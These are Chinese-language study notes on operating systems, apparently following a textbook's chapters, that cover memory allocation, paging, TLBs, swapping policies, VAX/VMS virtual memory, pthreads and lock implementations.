管理内存的算法有很多，成百上千，例如最佳匹配、最差匹配、首次匹配等，不过它们只能是尽量减少碎片的产生，暂时还无法完全消除它（因为那意味着要付出其他方面的代价）； 虽然粗颗粒度段的方式部分解决了内存使用效率问题，但其实它并不能完全解决，因为对堆的高效使用，依赖于进程本身在虚拟地址空间中的管理算法。有可能某个进程所用的算法并不高效，导致用的堆空间很多，但其实很稀疏，这无形中就意味着物理空间的浪费 13.空闲空间管理 待解决问题：如何让碎片最小化？ 假设为了方便讨论内存管理算法的实现，先做一些简单的基本假设： 已分配内存在生命周期内大小不变； 内存分配后就不再被移动； 已分配内存是一块连续的区域； 底层机制分割与合并当申请分配的内存比某个空闲块小时，内存分配程序就会对空闲块进行分割； 当释放某个已分配的内存块时，内存分配程序会尝试合并，即先检查一下该内存块前后的内存块是否是空闲的，如果是的话，就跟它们合并成一个更大的空闲内存块； 记录已分配空间的大小当用户在调用 malloc 分配一块新的内存块时，实际分配的大小并不是用户传递的 size_t 参数，而是比它还要大上一点点，因为内存分配程序需要一个额外的头部空间来存储关于当前内存块的一些元信息，例如 size_t 和 magic number；当后续释放该内存块时，这个头部信息将派上用场。它使得用户在调用 free 函数释放内存时，只须传入指针，而无须传入 size；free 会自动根据指针值倒推（减去 header_t）得到真正的起始位置和实际大小； 空闲链表空闲链表是一种数据结构，它保存着哪些内存块是空闲的信息，每个内存块在链表中用一个 node 节点来表示，多个 node 相互连接就形成了空闲链表；每个 node 有两个属性，一个是 size，保存着当前内存的大小信息；一个是指向下一个 node 的指针值； 由于空闲链表用来管理空闲内存，而它自己又是需要内存存储的，因此它的每个节点信息实际是保存在每个空闲内存块的头部里面； 堆的增长大多数内存分配程序在开始只是通过系统调用向操作系统申请一块很小的堆，然后随着时间的推进，如果当前已分配的堆确实已经不够用了（做了各种努力之后，例如已经紧凑过了），分配程序会再次发起系统调用，向操作申请更多的堆空间；操作系统在收到请求后，会分配一块空闲的物理内存页，并将该物理内存的地址，映射到进程的虚拟地址空间中；之后进程就有了更大的堆可以使用了； 问：如果进程的堆是分两次单独申请的，如果操作系统前后给的两个物理空闲页是不连续的，接下来在进行地址转换时，要如何处理？ 答：操作系统使用一个页表来记录映射关系，在做地址转换时，查询该页表，得到正确的物理地址； 问：此处的分配程序，貌似其实是编译器？因为貌似没必要在程序运行期间，去找一个运行时库来管理已分配的内存？ 基本策略最佳匹配遍历整个空闲链表，找到和申请大小最接近的空闲内存块； 优点：最佳匹配，空间浪费最小化； 缺点：遍历比较费时，因此分配时间较久； 最差匹配遍历整个空闲链表，找到最大的块，分割它； 优点：一无是处，只有初衷是好的（它的初衷是想让可用的空闲块尽量的大）； 缺点：遍历费时，碎片还很多； 首次匹配在找到第一个大小满足要求的块后，就不再往下找了； 优点：快，无须遍历； 缺点：链表头部碎片特别多，后续查找的时间开始变长 下次匹配比其他策略多维护一个字段，用来记录上次命中后的位置，然后下一次从那里接着往后找； 优点：性能与首次匹配接近，但碎片更平均化，不会集中在头部； 其他方式分离空闲链表理论上用户每次申请的内存块的大小是不可预知的。但是由于局部性原理，代码对内存空间的使用不可避免存在某些规律，例如某种大小的内存块被申请的次数最多；因此，可以通过单独增加一个专门维护固定大小的块的链表；只要申请的内存块大小等于某个固定值，就交给这个专门的链表来分配；由于每个内存块的大小都是一样的，而且也无须合并，因此块的分配和释放，都可以在常数时间内完成，效率非常高；同时空间也不怎么浪费； 感觉这里开始有点分页的思想了！ 沿着这个思路继续往下开展，可以统计出那些最常用的块的大小，通过增加维护跟该大小一致的链表，来进一步提高内存使用效率； 伙伴系统伙伴系统将整个内存想象成一个巨大的 2 的 N 次方的空间；每当有一个新的分配请求时，就将空间反复进行二分，直到再次二分便无法满足请求时为止； 它的好处在于，当某个块被释放时，它马上可以检查旁边同等大小的伙伴是否空闲，如果空闲，马上就可以进行合并；合并后以后，再次检查伙伴，以此类推；因此它的合并是非常迅速的；而正因为了合并效率高，使得空间的外部碎片变少；但是内部碎片会多一些（因为不是每个请求都刚好是 2 的幂）； 其他想法有些策略的空间利用率高，但付出的代价是查找比较慢；为了进一步压榨提升性能，人们不惜通过牺牲简单性引入复杂性来换取性能，包括使用平衡二叉树、伸展树和偏序树等算法； 事实上并不存在一个完美而万能的分配程序，因为计算机被用于处理非常多完全不同类型的任务，每种任务都有其各自的业务特点；当对业务特点了解得越多的时候，才有可能选用越合适的分配策略，以大幅度的提高性能； 14.分页：简介操作系统有两种管理物理内存的方法： 参照虚拟内存的方法，将物理内存进行不同长度的分段；缺点：随着时间的推移，很容易形成碎片化，分配工作变得越来越困难； 按固定的长度单位，将物理内存分成 N 个单元（每个单元称为一个页）；优点：内存分配比较简单和灵活，因此每个虚拟空间中的页，刚好也映射物理内存中的一个页（通过页表来实现映射）； 由于内存映射是以页为单位的，因此在进行地理转换时，只需转换头部的页号即可，页内的偏移地址并不需要转换； 页表存储在哪里页表还是挺大的，例如对于32位的地址空间，每个页设置为 4 KB，因此需要单个页占用了 12 个位，剩下的 20 个位即是页号；每个页面条目假设占用 4 个字节，单个进程的页表大小为 2^20 * 4 字节，相当于 4 MB； 如果操作系统当前运行着 100 个进程，则总共要使用 400 MB 的物理内存空间来保存页表；这么大的存储量，显然无法保存在 CPU 中，因此通常是将其保存在物理内存中； 分页的代价是引入页表，额外消耗了一些存储空间，但换来了简单性和灵活性，也避免了碎片的问题；而在分段的机制中，是不需要页表的；同时分页也牺牲了一点性能，因为现在地址转换工作增加查询页表的环节； 页表中究竟有什么简化的来看，可以将页表当做一个巨大的数组，以虚拟页号做为索引，来访问其中的元素，元素包含的值除了物理页号外，还有一些额外的位，这些位分别起到不同的控制作用，包括： 有效位：表示是否有数据； 存在位：表示是否被交换到磁盘； 保护位：表示操作权限，例如只读、可写、可执行； 参考位：表示是否被频繁访问，如果是，则应该尽量保存在内存中，避免交换到磁盘； 脏位：表示页面放到内存中了后，是否有被修改过； 其他一些缓存用的位：如 PWT, PCD, PAT, G 等； 分页的性能代价虽然页表的设计让地址转换变得简单了起来，但是以牺牲部分性能为代价的；因为每一次内存引用，都需要做如下的地址转换计算： 从虚拟地址提取虚拟页号； 根据页表基址寄存器存储的基址，以虚拟页号为索引，获得物理页号； 根据物理页号从物理内存中读取数据； CPU 每执行一条指令之前，都需要先从内存中读取指令，之后才知道指令要执行的内容；而指令中可能含有从内存中读取数据或者更新数据的操作，此时 CPU 将需要再做一次内存的操作，以便得到数据或者写入数据； CPU 在程序计数器中存储着下一条指令的地址，在执行指令前，先从该地址将指令加载到 CPU 中，然后解读指令，并进行相关的操作； 除了性能外，分页的另外一个代价是占据较大的物理内存空间； 线性的单级页表确实比较大，但貌似可以通过非线性的多级页表来解决空间占用过大的问题？ 15.分页：快速地址转换 TLB分页固然带来了映射的极大简化，但是如果每执行一条指令，都需要读取物理内存中的页表来作地址转换，这将付出巨大的性能代价，为了弥补这个缺点，一般通过给地址转换器引入缓存来解决，利用局部性原理，减少对物理内存中页表的访问次数，提高地址转换速度； TLB 的基本算法在得到一个虚拟地址后，地址转换器先检查缓存中是否已经有映射条目，如果有则缓存命中，马上可以读取缓存，得到物理页号；如果没有，则需要访问一次物理内存中的页表，将条目写入缓存，之后再重新执行转换（第二次执行可以触发缓存命中） TLB 全称：Translation Lookaside Buffer 单页的尺寸越大，则缓存命中率就会越高；因为最小加载单位是一个页，如果这个页足够大，则接下来要访问的数据，很可能都在这个页中，一般单页的典型大小为 4KB； 如何处理 TLB 未命中有两种处理办法： 硬件办法：由 CPU 自行处理；这种办法会增加 CPU 设计的复杂性，因为 CPU 需要执行一些自己的代码（指令）并知道页表在物理内存中的位置和格式，因此需要设计较为复杂的指令集 CISC； 软件办法：由 OS 来处理；这种办法增加了灵活性，OS 可以使用任意数据结构，不像 CPU 一出厂就写死了；另外也让 CPU 的设计变简单了，只需要设计较简单的指令集，即 RISC； 随着 CPU 芯片集成的电路变得越来越大，两种指令集的差异消失了，复杂指令集现在运行起来跟简单指令集一样快； TLB 的内容TLB 是缓存，因此也可以看做是一个数组，这些数组的元素是无序的，每一个元素是一条 TLB 记录，记录中保存着某个虚拟地址和物理地址的映射；由于它们是无序的，因此每条记录中需要同时保存虚拟页号 VPN 和物理页号 PFN，不然仅有一堆物理页号则完全不知道它们属于哪个虚拟页号的了； 除了 VPN 和 PFN 外，一条 TLB 记录中还有几个额外的位来存储一些额外的信息，例如： 有效位：用来判断当前记录中的映射信息是否有效，这样在切换进程时，只需将有效位全部设置为无效即可，无需删除整条记录；这样就可以避免当前进程使用上一个进程的映射了（重置缓存中所有条目的有效位也是一个不小的工作，因此还有另外一种办法是引入地址空间标识符，来判断当前进程是否匹配）； 保护位：用来标记该页的内容的访问权限，例如是只读、可写，还是可执行等； 另外还有一些其他位如地址空间标识符、脏位等； 上下文切换时 TLB 的处理一种方案是直接重置所有有效位为 0，这种方法可以确保新进程不会访问旧进程的映射，但是它的缺点是性能开销很大；解决的办法是通过引入地址空间标识符（一般是8个位），来代表不同的进程，这样在切换时，就不需要重置了，但是在搜索时，需要增加对这个标识符的判断，只有标识符 和 VPN 都匹配时，才是缓存命中； TLB 替换策略有两种可用策略： 最小引用策略：即将最近最少使用的 TLB 换出；优点是尽量保持高命中率；缺点是偶尔会出现极端情况； 随机策略：随便选择一项换出；不会出现极端情况，但整体命中率有所降低； 实际系统的 TLB 表项此处是 MIPS R4000 操作系统来举例，在这个操作系统的设计中，使用软件来管理 TLB；因此在遇到缓存没有命中时，需要用到操作系统提供的关于更新 TLB 的一些指令； 该系统单个 TLB 记录有 64 个位，其中： 有 19 位用来存 VPN（正常是20位，但因为地址空间有一半被预留给内核，因此实际的用户空间只用 19 位即可表示）； 有 24 位用来存 PFN（因为可以支持最大 2^24 的地址空间，约为 64GB 的物理内存）； 有 1 个 G 位用来表示当前的记录是否是全局的，如果是的话，则不用检查地址空间标识符； 有 8 位用来存储地址空间标识符； 有 3 位用来表示一致性； 有 1 个 D 位（脏位）用来表示记录是否被改写过； 有 1 个 V 位（有效位）用来表示当前记录的内容是否有效； 剩下的都是一些暂未使用的位； MIPS 的 TLB 一般总共有 32 个记录或者 64 个记录；大多数留给用户进程使用，但它有一个寄存器，可以用来设置有多少个记录需要预留给内核使用；在这些预留的记录中的映射，用来保存操作系统自己在某些时刻下要用的代码和数据； 16.分布：较小的表简单数组结构的单级线性页表带来的一个问题是占用空间过大，因此需要寻找新的办法，例如通过以时间换空间的方法，来解决内存占用过大的问题。 方法一：更大的页由于地址长度是固定的，因此如果单页变大，则页号的范围变小，因此页表的记录数也随之变少，这样页表就变小了；例如对于 32 位地址，单页设计为 12 位，此时单页的大小为 2^12 字节，约为 4KB，页表条目需要 20 位，因此有 2^20 个条目，每个条目有 4 字节，总共需要 4MB；如果将单页设计为 14 位，大小变成 16 KB，则页表条目只需 2^18 个，少了 4 倍，变成 1MB； 结果看上去不错，占用空间只剩下 1MB 了，而且还提高了缓存命中率；但其实这是以增加单页的内部碎片为代价的，即每次为进程分配内存时，最小单位都是 16KB，但它实际上可能常常用不了这么多，因此造成了很多内部空间浪费； 更大的单页有一个额外的好处是可以提高 TLB 的命中率，减少 TLB 记录数；这对于某些特定的应用，例如数据库管理程序很有必要，因为数据库中的数据是挨在一起的一个整体，而且经常频繁的随机访问，通过大单页，例如单页 4MB，可以有效提高缓存命中率，减轻 TLB 的压力； 方法二：分段+分页由于虚拟地址空间很大，但实际的进程实际的地址，只占里面很小很小的一部分，因此如果页表为整个虚拟地址空间都提供映射记录，显然绝大部分记录都是空的，存在巨大的空间浪费；所以，可以通过引入分段，为虚拟地址空间中的不同段，提供不同的页表，而不再是一个页表； 由于分段在原先的虚拟内存设计中就已经天然存在，因此可以提前已经存在的段基址寄存器（包括代码段、堆段和栈段），让它们的值指向对应段的页表的物理内存地址，即可以访问每个段各自的页表； 简单的分段其实并不能带来页表占用空间变小的好处，因为每个段也是很大的，关键点在于引入每个段的界限；当一个段拥有界限后，它不再是很大了，而是有限的大（通常都很小）；界限的存在是通过界限寄存器来实现的，通过在界限寄存器中保存一个段大小的值，我们就拥有了有限大小的段；然后页表的记录数，也只需跟段的大小匹配即可，这样页表就变得很小了； 分段+分页的方法其实是要付出一定的性能代价的，因为段的大小是动态可变的，这意味相应段的页表也变成了动态的；因为当原分配给页表的空间不够用时，就需要为页表分配新的空间并迁移它； 方法三：多级页表虚拟地址空间也是很稀疏的，通过引入页表，让它在物理内存中的存放变得紧凑和灵活了起来；同样的思想也可以运用在页表本身的存储上面，通过引入页目录的结构（作用跟页表类似），页表不再被线性存储，而是映射存储；这个方法的优点是占用的空间大大减少了，只按最小单位（页）来存储，没有浪费；缺点是需要付出一定的性能代价，因为页目录本身也是需要存储在内存中，在得到最终的 PFN 前，需要增加一次或多次物理内存访问（取决于页表分成几级）； 就像内存虚拟化技术一样，多级页表相当于将页表虚拟化了；而且还不只是一级的虚拟化，为了最小化内存占用，还可以丧心病狂的使用多级虚拟化； 方法四：反向页表反向页表的思路更加极端，在多级页表中，每个进程拥有自己的页表，而反向页表，则是所有进程共用一个页表；该页表的单个页表项中，包括三方面的信息： 地址空间标识符：用来记录当前记录属于哪个进程； VPN 虚拟页号 PFN 物理页号 然后使用 HASH 散列表结构来建立映射和存储；类似于以字典键值对的方式来实现映射和转换；优点是极端节省空间；缺点是性能将有所下降，因为随着字典变大，需要进行迁移，分配更大的空间来容纳映射关系； 方法五：交换到磁盘这个方法倒是一劳永逸的节省空间，但是性能最差； 17.物理内存不足：机制虽然现在的物理内存相对早期已经大了，但是应用程序运行时所占用的内存也比过去变得更大；当同时运行的应用程序足够多时，不可避免会遇到物理内存不足的情况，此时需要有一个机制，能够将部分物理内存转移到其他存储空间，等需要的时候，再转回来，以避免物理内存不足的窘境； 交换空间交换空间 swap space 机制是现代系统使用的一种解决方案；通过将部分暂时不用的物理内存页，交换到硬盘中，来缓解内存不足的问题； 进程运行起来后，代码已经被加载到内存；如果此时运行下一个程序时，发现内存不足，此时有两种解决方案，一是将上一个程序的代码转移到交换空间中；另一个是不交换，等后续要用的时候，再重新从硬盘中加载，因为代码本来就是从硬盘中加载过来的； 存在位为了能够实现交换空间机制，需要在页表中额外安排一个位，用来表示当前条目所代表的物理内存页，是否真的在物理内存中，还是在硬盘上，这个位称为有效位； 当试图访问一个存在位为 0 的物理页时，会触发页错误，然后操作系统会接管并处理这个错误，将数据从硬盘加载到内存中，然后重新执行指令； 页不存在只是页错误的一种，还有其他情况也会触发页错误，例如非法访问； 页错误当数据存储在物理内存页中的时候，PFN 是有用的，但是如果该页被交换到了硬盘中，则 PFN 就没有用了（失效了），此时只需通过存在位，即可以触发页错误；因此，无效的 PFN 所占用的位，刚好可以用来存储数据在硬盘上面的位置索引；操作系统可以根据该索引，从交换空间中，将数据加载回内存；然后更新页表中的 PTE 条目的 PFN 为最新值，并更新 TLB 记录（硬盘管理 TLB 的系统估计不更新，只有软件管理的才会），之后重试指令； 交换策略当从硬盘中将页数据交换回物理内存时，有可能物理内存已经是满的，此时需要将部分页换出到硬盘上，如果选择待换出的内存页，需要使用一个好的交换策略，以避免给程序运行带来巨大的性能损失； 页错误处理当页错误被触发时，操作系统从 PTE 中获得硬盘地址，然后在物理内存中寻找到空闲页，访问硬盘读取页数据，并加载数据到空闲页中，将该空闲页的页号更新到 PTE 中；如果没有找到空闲页，则会触发页交换，将物理内存中已有的部分页面，交换到硬盘上； 什么时候交换操作系统会设置两条线，一条是低水位警戒线，当物理内存中可用的空闲页低该警戒线时，就会触发页交换守护进程（page daemon 或 swap daemon）；另一条是高水位安全线；交换守护进程的交换工作会一直持续到当前可用的内存页到达安全线后停止下来，然后进入休眠状态，直到下次被唤醒； 由于硬盘的写入速度很慢，交换进程会凑齐足够数据的待交换页后，再一次性交给硬盘处理，从而提高硬盘的访问性能； 18.物理内存不足：策略当物理内存满了时，选择哪些页面，将它们转移到交换空间，是一个需要好好思考的问题；由于硬盘的访问速度非常慢，因此如有可能，应该尽量避免出现访问硬盘的情况，至少要让概率尽可能小； 理想的替换策略是将未来最不可能用到的页替换出来，这样命中率是最优的，缺点是这个策略基本无法实现；因为在替换的时候，我们无法开启上帝视角，无法判断哪个页是将来最不可能会用到的； 简单策略：FIFO先进先出是最简单的策略，缺点是命中率比较低； 随机策略：Random优点：实现简单； 缺点：性能看运气； 基于历史：LRULRU 是 Least Recently Used 的缩写，表示最少最近使用； 这个策略利用了程序运行时常常表现出来的局部性特征，即最近访问的数据，也可能在接下来再次被访问； 性能视场景而定不同的业务场景将决定不同策略的性能表现，虽然 LRU 在多数情况下表现的更好，但它也有一些应付不了的极端情况，此时有可能随机策略反而表现得更好； LRU 的实现想要实现 LRU 是有难度的，因为它需要额外记录每个内存页最近被引用的时间，这样才能判断出谁是最少最近使用的；但随着物理内存变大，页表条目变多，通过全局扫描查找最少最近使用条目，将需要付出巨大的时间代价，有可能得不偿失； 近似 LRU由于完美的 LRU 实现代价很大，因此需要寻找一个近似的替换算法，这样既可以避免性能开销，又可能达到类似的命中率效果； 这类型的近似算法有很多，它们大体的思路也类似，即通过增加一个使用位，来标示当前页是否最近被使用，初始默认所有页的使用位都为 0；使用某个指针寄存器，让它随机批向一个页；当某个页被读写的时候，就将其使用位设置为 1，表示最近该页有过读写的动作；当需要进行页替换时，操作系统通过指针往下遍历每个页，如果某页的使用位为 1，则将其设置为 0，然后继续往下查找，当找到第一个“使用位”非 0 的页时就进行替换； 除了使用遍历查找外，还可以考虑使用随机查找，效果差不多； 考虑脏页由于与硬盘通信的开销很大，一般会将多个修改后的页进行批量化处理，集中一次性的写入，而不是改一个写一个；因此在替换内存页的时候，有可能会遇到该页暂未写入硬盘的情况；因此，通过增加一个修改位（脏页位）来对已修改未写入的页进行标识，不替换该页，而是尽量替换干净页； 其他读写策略除了页替换策略外，虚拟内存还同时使用一些其他的策略来提高内存管理的效率，例如： 按需读取策略：只在页被指令访问时，才将页从硬盘中加载到内存中； 预读取策略：只在有很大把握某个页接下将被访问时，提前将页从硬盘中加载到内存； 批量写入策略：集中将多个内存页的修改，一次性写入硬盘，而不是改一个就马上写入； 抖动当应用程序对某个巨大的数据结构进行计算时，如果该数据结构占用的内存超过了物理内存的可能容量，那么在计算过程中，部分数据将被交换到硬盘中，然后又很快需要被加载回来，同时又换出去一部分，反复循环，导致 CPU 都将时间花费在了触发页错误和加载数据过程中，完全没有办法进行实际的计算，这种情况称为内存的抖动； 19.VAX&#x2F;VMS 虚拟内存系统操作系统的部分功能需要硬件的配合，才有可能高效稳定的实现，但是市场上的硬件种类多种多样，而且不同硬件的开发人员水平参差不齐，不可避免存在缺陷，因此操作系统的开发者将不可避免需要解决通用性的问题，即如何让同一个操作系统，在不同的硬件上面，都可以稳定的运行。 操作系统的存储操作系统本身也需要物理内存来存储自己的代码和数据，它有三种实现方式： 直接存储在物理内存中（缺点：无法实现页交换，因为没有虚拟内存这一层） 有自己的完整虚拟内存，像是另外一个单独的应用程序（缺点：不方便和应用程序之间的数据通信） 做为应用程序的一段分，使用单独的段（内核段）来映射它（目前为大多数系统所采用） 问：好奇是内核否有自己的单独页表，还是与应用程序共用一张页表，因为内核段也有自己的堆，意味着有动态的数据需要存储？如果是共用页表的话，每张页表都有一些重复的项目，有一定的空间浪费； 答：实际上很可能是使用分段+分页的机制，即总共有三对基址寄存器和界限寄存器（总共6个）；内核段有自己的基址和界限寄存器，而且还是每个应用共用的；在进行应用程序切换时，只需要改变 P0 和 P1 寄存器，无须改变 S 寄存器； 页替换 问：在进行页替换的时候，LRU 策略是一种全局的策略，它只会从当前页表的所有条目中，挑出最少最近使用的进行替换，而无视这些页表本身是否占用了过大的内存；因此，需要设计一种机制，对单个进程的可用内存上限进行控制； FIFO解决方法是为每个进程设置一个可用内存的上限（由于内存是分页的，相当于有了一个可用的页数上限）；将进程的所有页都放在一个 FIFO 列表中，当列表的长度达到上限时，就基于先进先出的原则，将最早写入的页从 FIFO 列表中清除，并替换到硬盘上的交换空间中； 如果可用上限值比较小，立即执行的 FIFO 策略，将有可能使得进程的性能下降，因为其数据频繁的在内存和硬盘之间交换；为了提高性能，VMS 系统额外增加两个全局的列表，一个用来存放干净的页，一个用来存放脏页； 当某个进程 P 的 FIFO 列表满了时，踢出的页并不会马上被交换到硬盘中，则是先放入干净页或者脏页（取决于脏位的值）的末尾，此时进程 P 的性能并没有受到任何的影响，因为它所有的页仍然在内存中； 当进程 P 执行结束，切换到进程 Q 时，如果进程 Q 需要用到一个空闲页来存储数据时，系统就从干净列表的头部取出一个页，将其替换到硬盘上，然后交给进程 Q 使用； 如果两个全局列表的长度足够大，这种策略的性能将非常接近于 LRU 策略；这个策略本质上利用了局部性的原理，将各个进程要换出的干净页先集中放在一起，然后按时间顺序，先进先出的替换；这样避免了替换最近的页，而是替换最远的； 批量处理上述增加全局脏页列表的做法，还有另外一个好处，即由于写入硬盘的性能代价比较大，因为可以等到脏列表满了后，再一次性的批量写入，这样就可以尽量减少写入的次数；写入完了后，原来的脏页就变成了干净页了； VMS 的页表条目中，并没有额外的使用位来标记条目所代表的页，是否最近被引用过；它使用了另外一个巧妙的机制，来达到相同的效果，即使用保护位；初始化的时候，所有条目的保护位先置为不可访问；因为操作系统在访问一个页之前，即判断它的权限，如果可访问，则将保护位设置为只读或可写；这样，当需要进行页替换时，操作系统可以通过查看保护位是否被重置过，如果有，表示最近有被使用；如果没有，表示未被使用； 问：将应用程序从硬盘中加载到内存中的时候，到底发生了什么？ 答：操作系统需要做如下事项： 在进程表中增加一个条目，并写入一些关于进程的元信息 初始化一个新的页表（此处假设是单个线性页表），在进程条目中记录该页表在物理内存中的位置 寻找空闲页，将代码和数据载入空闲页中，将空闲页的 PFN 写入页表的相应位置； 惰性技巧按需置零因为物理内存是在多个应用程序间共用的，当某个物理内存页被 A 进程释放后，随后该页可能会被进程 B 使用，但此时页上面仍然留有 A 进程的数据，因此需要避免这些数据被 B 访问，这样才能确保安全性；比较土的办法是在该页分配给 B 使用时，就将该页上面的全部数据置 0，这样做可以确保绝对安全，但是性能代价很大，因为有可能 B 只用到该页的一小部分空间，大部分空间并不使用； 通过引入按需置零策略，可以减少性能开销；在分配页给 B 时，操作系统只是先通过保留位将该页标记为按需置零，并不真正的去置零；然后在真的要读写数据时，在检查权限的时候，操作系统顺便检查按需置零位，如果为真，则再做一下置零的工作； 写时复制当某页数据需要从进程 A 复制到进程 B 时，操作系统一开始并没有直接的复制数据，而只是将该页的物理页号写入进程 B 页表中，这样两个进程不同的 VPN 映射到了相同的 PFN，并在进程 B 中将该页标记为只读；后续如果进程 B 需要对该页进行写入操作，操作系统发现该页为已读，此时才会触发真正分配新页和复制工作； 这个技术在 FORK 的时候特别有用，减少了极大的性能开销；另外在多个进程之间使用共享库时也有用； 20.并发：介绍通常情况下，进程只面对一个使用者，仅有单一的任务目标，完成一系列指定的操作并得到结果；但是有些情况下，进程可能要面对多个使用者，例如运行在服务器上的进程，为成千上万的访问者提供服务；这些访问者发起的服务请求，对进程来说形成了一种并发的挑战；为了应对这个挑战，引入了线程的概念； 每个线程拥有自己一个独立的栈，不同线程之间的栈不会相互干扰；但它们共用进程的整个地址空间；因此，在切换线程时，并不需要更改页表的寄存器，只需更新程序计数器，以及其它用于存储计算结果的寄存器； 进程切换时，需要保存当前进程的状态，使用进程控制块（Process Control Block，PCB）来保存； 线程切换时，使用原理类似的线程控制块（Thread Control Block，TCB）来保存； 当创建一个线程时，需要传递待执行的例程（即函数）给它，至于这个例程什么时候被 CPU 安排执行，则是不可控的，它有可能比主程序的下一行代码早，也可能比它晚，一切取决于操作系统的调度程序当时心情怎么样。 并发场景 修改全局变量：两个线程访问修改彼此共享的变量； 依赖：一个线程的执行需要等待另外一个线程的结束； 21.插叙：线程 API创建与完成 问题：操作系统应该提供哪些创建线程的接口，并当它们简单易用？ 在 C 中，可以通过 POSIX 库的 phread_create 函数来创建线程，并通过 phread_join 函数来等待它的返回； 如果每创建一个线程后，马上调用 join 函数等待它的返回，这样完全没有意义，完全实现不了并发，其使用效果跟普通的函数调用没有任何区别；因此重点在于在等于线程返回前，有机会创建更多的线程，这样才有可能实现并发的效果； 有些多线程的 Web 服务器会创建一个主线程，并根据需要创建大量的工作线程；当主线程收到用户的请求后，会将该请求转发给某个刚创建好的工作线程，并且也不需要等待它的返回，这样一来，主线程本身就实现了并发的处理，即它在理论上可以接收并处理海量的请求（具体的数量上限取决于硬件的能力） 锁当线程需要对共享的全局变量进行修改时，不可能避免需要处理并发的问题；Pthread 库通过引入锁机制来实现；原理也非常简单，先初始化一个锁类型的变量，当需要执行临界代码时（即将改变共享变量的代码），调用 phread_mutex_lock 来尝试获取锁； 如果能够得到，就继续往下执行代码，并在执行完毕后调用 pthread_mutex_unlock 函数来释放锁，以便让其他等待中的线程可以获取到锁； 如果不能得到，就进入阻塞等待的状态，直到获取到锁为止； Pthread 库中另外还有其他与锁相关的函数，包括： pthread_mutex_trylock：用来尝试获取锁，如果得不到，直接返回失败，不等待； pthread_mutex_timelock：用来尝试获取锁，并在给定的时间内等待，如果时间到期后仍然得不到，返回失败； 用途：锁的机制可以用来解决多个线程修改共享的全局变量场景； 条件变量 用途：条件变量可以用来解决线程之间的依赖等待关系；仅靠条件变量性能不够好，结合锁的使用，有助于提高性能，避免等待线程出现自旋；假设有两个线程，其中 B 需要等待 A 的结果；当 B 获取不到锁时，就进入睡眠；如果 B 能够获取到锁，但条件变量未满足，则 B 就释放锁，然后进入睡眠；A 则负责获取锁，并在计算完成后，改变条件变量，然后释放锁，并唤醒 B； 假设某个线程 A 的执行，依赖于另外一个线程 B 的完成，则 B 在完成后，需要释放某种信号，以便 A 可以知悉状态，并开始执行自己的代码； 最简单的办法是引入一个标记变量（或叫状态变量），A 线程定时检查标记变量是否发生了变化，如果已经变化了，就开始执行自己的代码；B 线程负责在完成自己的工作后，改变标记变量的值，以便传递信号通知 A 线程； 但是上述这种方法的性能很不好，因为 A 线程需要循环的检查标记变量，可能在大部分时间内，其检查工作都是无用的；为了解决性能，可以通过引入条件变量和锁变量，利用条件变量的特殊性来降低性能损失；其原理是先调用函数让需要等待的线程 A 进入睡眠状态，然后 B 线程通过改变条件变量来唤醒它；这样 A 线程在等待期间就不需要反复检查前一种方法中的标记变量了；这种方法更加安全的原因在于 A、B 线程通过引入锁保证了执行的先后顺序； pthread_mutex_wait(&amp;cond, &amp;lock)：该函数接收一个条件变量和一个锁变量作为参数；当调用该函数时，它会让当前线程 A 进入睡眠状态，并释放锁； pthread_mutex_signal(&amp;cond)：在线程 B 中，在获得 &amp;lock 指向的锁后，开始执行自己的代码，并在执行完毕后，调用 pthread_mutex_signal 函数，它会更改 &amp;cond 变量，以便发出信号唤醒处于睡眠状态的 A 线程；之后线程 B 还需要调用 pthread_mutex_unlock 函数释放锁，以便线程 A 在唤醒后可以获得锁 &amp;cond 可以用来唤醒另外一个进程，但为了保险起见，书中的例子还额外引入了一个 ready 变量，来确保 B 线程的代码真正完成了指定的操作，以便防止 A 线程被意外唤醒的情况；相关于有了双保险的机制； 22. 锁表面上看，锁好像是一个类似状态变量的东西，但其实它是一个结构，里面除了保存状态值外，还保存着当前持有它的线程信息，只是这些信息通常对使用者是隐藏的； 问：锁为程序员提供了一个很方便的实现线程有序并发的工具，但在操作系统和硬件层面，它们需要如何实现锁的机制？ 答：需要 CPU 提供一些原子性的指令，这些指令可以用来修改设置变量，从而实现锁的机制；仅由软件实现的锁机制是不可靠的，因为完全不知道 CPU 的时钟中断何时会发生，而一旦发生，将使得处理逻辑失效； 评价锁锁的实现有多种方案，有三个维度可以用来评价实现方案的优劣： 有效性：能够真的实现互斥的效果； 公平性：不至于有些等待线程一直无法抢到锁，导致最终饿死了； 性能：引入锁之后，性能开销最小化； 方案1：控制中断之所以会面临并发的问题，在于 CPU 的操作并非原子性的，它通过时钟中断来实现在不同进程或线程之间的切换；因此当线程进入临界区后，如果能够关闭中断，等待当前线程处理完，再恢复中断，就可以实现互斥性； 控制中断的方案实现起来很简单，但是缺点很多，包括： 无法规避恶意程序； 无法支持多处理器； 中断时可能丢失其他程序发出的中断消息； 性能太差：因为 CPU 内部要做一系列准备工作； 基于以上这么多的缺点，这种实现方案用得场景非常少；仅在操作系统内部使用，而不是在 CPU 内部使用，即操作系统选择性的在某些时刻暂时屏蔽它自己接收到的中断消息，将手头某个任务全部处理完后，再恢复处理中断队列中的消息； 没有硬件支持，仅通过软件实现的锁很危险，因为完全无法控制时钟中断何时会发生，有可能当前线程 A 正检查完锁可用时，中断了，切换到另外一个线程 B，然后它也发现锁可用；然后设置标记变量为 1；这时中断发生，切换回进程 A ，它接着上次的中断处继续进行，也觉得当前锁自己可用；最终的结果是两个线程同时进入了临界区；锁的互斥性根据没有得到有效实现；因此，必须有硬件的支持，让某些操作指令原子化； 方案2：测试并设置指令“测试并设置”指令也叫做原子交换（atomic exchange），它的思路是设置一条由 CPU 支持的原子性执行的指令；这条指令会取出旧值，设置新值，并返回旧值； 当有了这条原子性执行的指令后，应用程序就可以基于它们来实现锁；当一个线程暂时取不到锁时，它会陷入自旋等待，直到另外一个线程释放了锁为止； 在 x86 机器上，原子交换指令写成 xchg； 自旋等待的锁有两个缺点： 在等待期间，会消耗掉分配给它的完整时钟周期，无谓消耗浪费了很多性能；当线程特别多且为单处理器时，这点尤其明显； 自旋机制本身不保证线程不会饿死，线程能否抢到锁，完全看调度器的心情； 方案3：比较并交换指令“比较并交换”指令也是一条由 CPU 支持的原子性执行的指令，它跟“测试并设置“指令的区别在于多了一个参数，这个参数会传入一个预期值，若旧值和预期值相同，再更新为新值，否则不更新；该指令也同样会返回旧值； 相当于“测试并设置”一定会更新旧值，而“比较并交换“不一定会更新旧值； 